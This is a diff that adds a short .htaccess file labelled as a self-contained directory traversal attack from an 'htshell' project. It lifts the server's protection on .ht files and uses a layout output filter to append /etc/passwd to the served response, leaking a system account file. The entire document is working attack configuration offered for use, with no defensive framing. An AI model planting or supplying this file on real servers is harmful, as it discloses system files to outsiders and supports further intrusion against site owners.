@@ -1,0 +1,10 @@
+# ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id
+# Self contained .htaccess directory traversal attack - Part of the htshell project.
+
+<Files ~ "^\.ht">
+    Order allow,deny
+    Allow from all
+</Files>
+
+AddOutputFilter LAYOUT .htaccess
+LayoutFooter /etc/passwd
